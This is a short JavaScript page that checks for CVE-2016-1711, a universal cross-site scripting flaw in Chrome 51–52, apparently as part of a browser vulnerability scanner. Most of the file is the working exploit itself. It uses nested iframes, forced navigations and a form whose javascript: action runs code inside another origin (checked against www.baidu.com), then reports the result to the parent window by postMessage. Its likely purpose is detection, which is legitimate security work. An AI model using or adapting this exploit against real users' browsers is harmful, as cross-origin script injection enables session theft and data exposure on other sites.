<script>    
    
    VULN_NAME='CVE-2016-1711';
    VULN_VERSION=['Chrome 51','Chrome 52'];
    
    function post_result(check_state) {
        var parentwin = window.parent;
        var post_result_json={};
        post_result_json.vuln_name=VULN_NAME;
        post_result_json.vuln_version=VULN_VERSION;
        post_result_json.vuln_valid_state=check_state;

        parentwin.postMessage(post_result_json,'*');
    }

    var check_is_valid_state=false;

    window.onmessage=function(message) {  //  TIPS :UXSS 一般在子窗口中执行代码,所以在这里需要先用一个onmessage 做一下中转,然后再传回主窗口..
        if ('boolean'==typeof message.data) {
            check_is_valid_state=message.data;
            
            post_result(check_is_valid_state);
        }
    }

    function check_is_valid() {
        if (!check_is_valid_state)
            post_result(check_is_valid_state);
    }
    
    
    
    var i = document.documentElement.appendChild(document.createElement('iframe'));
    var d = i.contentDocument.open();
    var s = d.appendChild(d.createElement('iframe'));

    onload = function() {
      var a = d.createElement('a');
      a.href = 'data:text/xml,';
      a.click();
    }

    s.contentWindow.onmessage=window.onmessage;
    
    s.contentWindow.onunload = function() {
      stop();
      setTimeout(g, 1);
    }

    function g() {
      i.onload = function() {
        var x = d.createElement('form');
        x.action = 'javascript:function post_result(){var parentwin=window.parent;parentwin.postMessage(true,"*")};if ("www.baidu.com"==document.domain) post_result(true);';
        x.submit();
//          return;
      }
      i.src = 'https://abc.xyz';
    }

    function f() {
      var a = d.createElement('a');
      a.href = 'data:text/html,';
      a.click();
      d.close();
      a = d.createElement('a');
      a.href = '#';
      a.click();
      a = d.createElement('a');
      a.href = 'http://www.apple.com';
      a.click();
    }

    console.log(VULN_NAME);
    setTimeout(f, 100);
        
    setTimeout('check_is_valid()', 10000);
</script>